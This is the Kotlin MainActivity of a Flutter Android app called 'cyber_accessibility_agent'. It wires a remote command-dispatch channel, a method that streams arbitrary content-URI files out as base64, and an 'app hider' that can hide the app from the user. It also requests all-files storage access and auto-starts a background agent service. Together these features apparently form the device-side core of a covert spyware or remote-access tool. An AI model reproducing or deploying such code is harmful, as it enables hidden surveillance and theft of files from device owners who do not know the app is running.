// android/app/src/main/kotlin/.../MainActivity.kt
package com.example.cyber_accessibility_agent

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.util.Base64
import android.util.Base64OutputStream
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.io.*
import java.util.concurrent.Executors

class MainActivity : FlutterActivity() {

    private val TAG = "MainActivity"

    private val COMMAND_CHANNEL = "cyber_accessibility_agent/commands"
    private val PERM_CHANNEL = "cyber_agent/permissions"
    private val APP_HIDER_CHANNEL = "cyber_accessibility_agent/app_hider"
    private val PERM_REQUEST_CODE = 14523

    private var pendingPermResult: MethodChannel.Result? = null
    private val executor = Executors.newSingleThreadExecutor()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        checkAndStartAgent()
    }

    override fun onResume() {
        super.onResume()
        checkAndStartAgent()
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        // ----- COMMAND CHANNEL -----
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, COMMAND_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "dispatch" -> {
                        val args = call.arguments as? Map<*, *> ?: run {
                            result.error("INVALID_ARGS", "Expected Map", null)
                            return@setMethodCallHandler
                        }

                        executor.execute {
                            try {
                                val res = CommandDispatcher.dispatch(
                                    context = this,
                                    id = args["id"]?.toString() ?: "",
                                    action = args["action"]?.toString() ?: "",
                                    payload = args["payload"] as? Map<*, *> ?: emptyMap<String, Any>()
                                )
                                result.success(res)
                            } catch (e: Exception) {
                                Log.e(TAG, "dispatch error", e)
                                result.success(mapOf("success" to false, "error" to (e.message ?: "exception")))
                            }
                        }
                    }

                    // lightweight ping exposed on same channel
                    "ping" -> result.success(mapOf("status" to "ok", "device" to android.os.Build.MODEL))

                    // Read content URI bytes in streaming fashion
                    "readContentUri" -> {
                        val args = call.arguments as? Map<*, *>
                        val uriStr = args?.get("uri")?.toString() ?: ""
                        if (uriStr.isBlank()) {
                            result.error("INVALID_ARGS", "uri required", null)
                            return@setMethodCallHandler
                        }
                        executor.execute {
                            try {
                                if (!uriStr.startsWith("content://")) {
                                    result.success(mapOf("success" to false, "error" to "not_content_uri"))
                                    return@execute
                                }
                                val uri = Uri.parse(uriStr)
                                val meta = try {
                                    FileHelpers.getContentUriMeta(this, uri)
                                } catch (e: Exception) {
                                    Log.w(TAG, "getContentUriMeta failed: ${e.message}", e)
                                    mapOf<String, Any?>()
                                }
                                val b64 = streamBase64FromContentUri(uri)
                                if (b64 == null) {
                                    result.success(mapOf("success" to false, "error" to "read_failed", "meta" to meta))
                                    return@execute
                                }
                                result.success(mapOf("success" to true, "b64" to b64, "meta" to meta))
                            } catch (e: Exception) {
                                Log.w(TAG, "readContentUri error: ${e.message}", e)
                                result.success(mapOf("success" to false, "error" to (e.message ?: "exception")))
                            }
                        }
                    }

                    else -> result.notImplemented()
                }
            }

        // ----- PERMISSION CHANNEL -----
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, PERM_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "checkStoragePermissions" ->
                        result.success(currentPermissionMap())

                    "requestPermissions" ->
                        requestPermissions(result)

                    else -> result.notImplemented()
                }
            }

        // ----- APP HIDER CHANNEL -----
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, APP_HIDER_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "hide" -> result.success(AppHider.hide(this))
                    "show" -> result.success(AppHider.show(this))
                    "isVisible" -> result.success(AppHider.isVisible(this))
                    else -> result.notImplemented()
                }
            }
    }

    private fun checkAndStartAgent() {
        val perms = currentPermissionMap()
        if (perms.values.all { it }) {
            startAgentService()
        }
    }

    private fun requestPermissions(result: MethodChannel.Result) {
        val need = mutableListOf<String>()

        // For API 33+ (TIRAMISU) we ask for READ_MEDIA_* instead of legacy READ_EXTERNAL_STORAGE
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            need += Manifest.permission.READ_MEDIA_IMAGES
            need += Manifest.permission.READ_MEDIA_VIDEO
            need += Manifest.permission.READ_MEDIA_AUDIO
        } else {
            // For older devices also request WRITE so app can delete files
            need += Manifest.permission.READ_EXTERNAL_STORAGE
            need += Manifest.permission.WRITE_EXTERNAL_STORAGE
        }

        // For Android R+ (API 30+) request MANAGE_EXTERNAL_STORAGE via system settings if not granted
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
            !Environment.isExternalStorageManager()
        ) {
            // open the settings UI for user to grant "All files access"
            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                data = Uri.parse("package:$packageName")
            }
            // use startActivityForResult so we can detect when user returns
            try {
                startActivityForResult(intent, PERM_REQUEST_CODE)
            } catch (t: Exception) {
                // fallback to plain startActivity if for some reason startActivityForResult fails
                startActivity(intent)
            }
        }

        val filtered = need.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (filtered.isEmpty()) {
            result.success(currentPermissionMap())
            startAgentService()
            return
        }

        pendingPermResult = result
        ActivityCompat.requestPermissions(
            this,
            filtered.toTypedArray(),
            PERM_REQUEST_CODE
        )
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode != PERM_REQUEST_CODE) return

        val map = currentPermissionMap()
        pendingPermResult?.success(map)
        pendingPermResult = null

        if (map.values.all { it }) {
            startAgentService()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == PERM_REQUEST_CODE) {
            if (currentPermissionMap().values.all { it }) {
                startAgentService()
            }
        }
    }

    private fun currentPermissionMap(): Map<String, Boolean> {
        val map = mutableMapOf<String, Boolean>()

        val manageAll = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else false

        map["manageAllFiles"] = manageAll

        map["hasAllFilesAccess"] =
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
                manageAll
            else
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_EXTERNAL_STORAGE
                ) == PackageManager.PERMISSION_GRANTED

        // write permission (important for delete on older devices)
        val writeGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // on R+ write access is covered by MANAGE_EXTERNAL_STORAGE
            manageAll
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
        map["writeExternalStorage"] = writeGranted

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            map["readMediaImages"] =
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_MEDIA_IMAGES
                ) == PackageManager.PERMISSION_GRANTED

            map["readMediaVideo"] =
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_MEDIA_VIDEO
                ) == PackageManager.PERMISSION_GRANTED

            map["readMediaAudio"] =
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_MEDIA_AUDIO
                ) == PackageManager.PERMISSION_GRANTED
        } else {
            // legacy read external
            map["readExternalStorage"] = ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_EXTERNAL_STORAGE
            ) == PackageManager.PERMISSION_GRANTED
        }

        return map
    }

    private fun startAgentService() {
        try {
            val intent = Intent(this, AgentService::class.java).apply {
                action = AgentService.ACTION_START
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(this, intent)
            } else {
                startService(intent)
            }

            Log.i(TAG, "AgentService start requested")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start AgentService", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        executor.shutdownNow()
    }

    // ===== STREAMED BASE64 READ =====
    private fun streamBase64FromContentUri(uri: Uri): String? {
        return try {
            contentResolver.openInputStream(uri)?.use { input ->
                val buffer = ByteArray(8192)
                val baos = ByteArrayOutputStream()
                // Use Android's Base64OutputStream which maintains encoder state correctly
                Base64OutputStream(baos, Base64.NO_WRAP).use { b64Out ->
                    var read: Int
                    while (input.read(buffer).also { read = it } != -1) {
                        b64Out.write(buffer, 0, read)
                    }
                    b64Out.flush()
                }
                // base64 data is ASCII, UTF-8 conversion is safe
                baos.toString("UTF-8")
            }
        } catch (e: Exception) {
            Log.w(TAG, "streamBase64FromContentUri failed: ${e.message}", e)
            null
        }
    }
}